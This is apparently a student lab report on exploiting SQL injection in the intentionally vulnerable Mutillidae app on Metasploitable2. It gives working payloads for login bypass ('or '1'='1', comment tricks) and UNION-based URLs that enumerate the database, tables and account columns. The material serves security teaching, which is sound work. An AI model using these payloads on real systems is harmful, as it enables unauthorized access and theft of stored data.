# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/3242ef5b-2cad-420a-b6d7-e5882ce17ebd)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/1a70bb63-70f4-4fe8-aa15-221adb647146)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/7f3d61d4-ed84-475d-a627-995dc8803656)

Click on the menu Login/Register and register for an account
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/9e405eee-bba2-44bf-a987-c71239fb56a4)

Click on the link “Please register here”
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/5e3f84b8-6032-4a4d-9abf-7d40108a7541)

Click on “Create Account” to display the following page:
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/e9624bf1-5d5b-4425-9b3c-d7319af6753b)

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/1b7f9538-7f82-482c-b0be-adeb192be3a6)

Click “Login”. The logged in page will show as below:
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/9e8e7d9f-d714-4756-b406-511712094804)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/ffc44ed6-1182-48dd-863c-2ffa29704a98)

Click the login button and you will see it enter into the administrator page.
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/44392be5-efff-43ea-903e-5d362da9a182)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/a32caed2-7d7b-4769-85a9-503cd936d5a7)


![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/c7696b3a-c62f-4912-8898-0e4a3b578422)


![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/592b4943-2ccc-4440-8a06-8402430e512f)


![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/f2f8b084-fbf6-44a0-9931-0a929986e78c)


![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/a8f98ae2-70db-4b96-a91f-cae6e429714f)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/de07fdd6-f197-4ecd-8bc9-71d39b0a5513)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/0b172a00-aebd-4e78-966a-cdcc2d25c424)

After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/377fe020-ebbd-4279-aa35-68b29d5010b2)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/30bbc5e6-0efc-401a-a8b0-0ca657d7b7f3)

As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/11437ebe-c4a0-4690-8503-58e0b5f67947)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/1cad5825-7f25-4d5d-85d6-8158046486a1)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/24567fd9-1f56-4700-a905-37f9b51e3cf9)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/742af93e-720a-42e2-93bc-2eb7ee7bf10a)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/0d3223d2-9931-44a2-bea6-ac7ebb9a90ff)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/9e7baea6-b543-4781-b0b5-b6186030e2c6)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/Sahithya373/sqlinjection/assets/147017926/12b6f8b0-aec2-4ecd-a99f-68f92f011eea)

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
